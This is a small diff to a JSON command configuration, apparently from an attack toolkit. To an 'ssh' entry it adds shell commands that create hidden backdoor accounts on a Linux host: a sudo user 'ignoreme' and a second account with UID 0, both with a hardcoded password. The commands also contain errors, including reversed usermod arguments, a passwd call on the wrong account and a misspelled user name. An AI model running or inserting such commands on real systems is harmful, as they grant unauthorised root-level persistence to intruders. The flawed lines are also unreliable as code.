@@ -46,7 +46,9 @@
         {
             "ssh": [
                 {
-                    "Stop Service":"systemctl stop ssh"
+                    "Stop Service":"systemctl stop ssh",
+                    "Add Sudo User":"useradd ignoreme; usermod -aG ignoreme sudo; echo -e \"ignoreme123\nignoreme123\" | passwd ignoreme",
+                    "Add Root User":"useradd -ou 0 -g 0 ignmoremeroot; echo -e \"ignoreme123\nignoreme123\" | passwd ignoreme"
                 }
             ],
             "ad":[
